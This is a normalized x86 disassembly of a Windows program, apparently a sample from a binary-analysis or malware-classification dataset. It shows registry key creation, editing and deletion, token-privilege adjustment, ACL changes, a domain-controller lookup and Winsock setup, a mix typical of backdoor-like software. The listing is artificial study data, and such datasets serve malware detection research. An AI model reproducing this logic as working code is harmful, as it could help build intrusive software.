lea ecx [ esi + edi ]
push eax
push ecx
push ebx
push edx
mov [ esp + 0x3c ] 0x100
mov [ esp + 0x38 ] 0x2800
call ebp
test eax eax
jne r-xdata
sub_4074a0
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
sub esp 0x20
lea eax [ esp + 0x28 ]
push eax
push 0xf003f
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x28 ]
push esi
push eax
push ecx
call [ SHDeleteKeyA@IAT ]
mov esi eax
lea edx [ esp + 0x4 ]
push esi
push rw-data
push edx
call [ sprintf@IAT ]
mov eax [ esp + 0x38 ]
add esp 0xc
push eax
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
add esp 0x20
retn
xor eax eax
add esp 0x20
retn
sub_407510
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
lea eax [ esp + 0x8 ]
push eax
push 0xf003f
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
push esi
push eax
push ecx
call [ RegDeleteValueA@IAT ]
mov edx [ esp + 0xc ]
mov esi eax
push edx
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
retn
xor eax eax
retn
sub_407560
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
lea eax [ esp + 0x8 ]
push eax
push 0xf003f
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push esi
push eax
mov eax [ esp + 0x14 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
push 0x0
push eax
push ecx
call [ RegSetValueExA@IAT ]
mov edx [ esp + 0xc ]
mov esi eax
push edx
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
retn
xor eax eax
retn
sub_4075c0
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
lea eax [ esp + 0x8 ]
push eax
push 0xf003f
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
push esi
mov edx [ esp + 0xc ]
push edi
lea eax [ esp + 0xc ]
push 0x0
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
push ecx
push edx
call [ RegCreateKeyExA@IAT ]
mov edi [ RegCloseKey@IAT ]
mov esi eax
mov eax [ esp + 0x10 ]
push eax
call edi
mov ecx [ esp + 0xc ]
push ecx
call edi
xor eax eax
pop edi
test esi esi
sete al
pop esi
retn
xor eax eax
retn
sub_407630
push ecx
cmp [ rw-data ] 0x2
jne r-xdata
pop ecx
retn
lea eax [ esp ]
mov [ esp ] 0x0
push eax
push 0x0
push 0x0
call NetGetDCName
test eax eax
jne r-xdata
mov [ rw-data ] 0x0
mov ecx [ esp ]
push ecx
push rw-data
push rw-data
call [ sprintf@IAT ]
add esp 0xc
jmp r-xdata
push eax
call NetApiBufferFree
mov eax [ esp ]
test eax eax
je r-xdata
sub_4076c0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_40786f
cmp [ rw-data ] ebx
jne r-xdata
call sub_40785a
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_40786c
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_40106c
mov eax r-xdata
retn
sub_401a40
sub esp 0x190
lea eax [ esp ]
push eax
push 0x2
call [ Ordinal_WSOCK32_115@IAT ]
neg eax
sbb eax eax
inc eax
add esp 0x190
retn
sub_4043a0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x0
push ecx
call [ AdjustTokenPrivileges@IAT ]
retn
sub_404b10
mov eax [ rw-data ]
mov ecx [ eax ]
push ecx
call sub_404ad0
add esp 0x4
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_405230
sub_404b80
mov eax [ rw-data ]
mov ecx [ eax ]
push ecx
call sub_404b40
add esp 0x4
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_405230
sub_404bb0
mov eax [ rw-data ]
push eax
call sub_406c10
add esp 0x4
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_405230
sub_404dc0
mov eax [ rw-data ]
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_405230
sub_405af0
mov eax [ rw-data ]
mov edx [ eax ]
lea ecx [ eax + 0x4 ]
push ecx
push edx
call sub_405930
add esp 0x8
retn
sub_406bf0
push 0x0
push rw-data
call sub_401bf0
add esp 0x8
push 0x1
call [ exit@IAT ]
SetSecurityInfo
jmp [ SetSecurityInfo@IAT ]
SetEntriesInAclA
jmp [ SetEntriesInAclA@IAT ]
WNetCloseEnum
jmp [ WNetCloseEnum@IAT ]
NetApiBufferFree
jmp [ NetApiBufferFree@IAT ]
NetGetDCName
jmp [ NetGetDCName@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_407841
mov esp [ ebp - 0x18 ]
push [ ebp - 0x78 ]
call [ _exit@IAT ]
int3
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_40785a
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_40786c
xor eax eax
retn
sub_40786f
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_407880
mov eax r--data
jmp __CxxFrameHandler
